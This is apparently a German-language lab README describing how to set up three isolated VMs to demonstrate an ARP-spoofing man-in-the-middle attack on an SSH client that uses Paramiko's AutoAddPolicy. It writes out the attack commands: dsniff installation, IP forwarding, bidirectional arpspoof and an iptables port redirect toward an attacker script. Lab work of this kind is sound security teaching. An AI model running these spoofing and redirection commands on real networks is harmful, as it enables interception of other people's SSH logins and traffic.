Vorraussetzung für den Angriff 01 AutoAddPolicy mit 3 VMs:
3 VMS (Egal welches Betriebssystem, für den attacker am besten kali). Network Adapter in allen 3 VMs auf LAN Segment umstellen und ein gemeinsames LAN Segment zu erstellen. Man kann zusätzlich einen Netzwerkadapter bei jeder VM hinzufügen um nach Außen kommunizieren zu können.
Dann IP-Adresse a eingeben und wenn im "eth0" noch keine IP-Adresse zugewiesen ist folgenden befehl eingeben:
```
sudo ip addr add 192.168.1.2/24 dev eth0
```
auf der Angreifer VM. 
```
sudo ip addr add 192.168.1.3/24 dev eth0
```
auf der Client VM und 
```
sudo ip addr add 192.168.1.4/24 dev eth0
```
auf der Server VM. 
Dann "dsniff" auf der Angreifer VM installieren und ARP Spoofing starten: 
```
sudo apt-get install dsniff
```
Befehl 1:
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
für IP Forwarding.
Zum starten des Angriffes:
```
arpspoof -i eth0 -t 192.168.1.3 192.168.1.4
arpspoof -i eth0 -t 192.168.1.4 192.168.1.3
```
Weiterleiten des Ports:
```
iptables -t nat -A PREROUTING -p tcp --destination-port 2222 -j REDIRECT --to-ports 2223
```
"server.py" und "attacker.py" auf den jeweiligen VM's starten.
Im Skript von "client.py" muss die Zeile:
```
ssh.connect("192.168.1.4", username='username', password='password', port=2222
```
geändert werden, um mit der IP-Adresse übereinzustimmen.
"client.py" starten
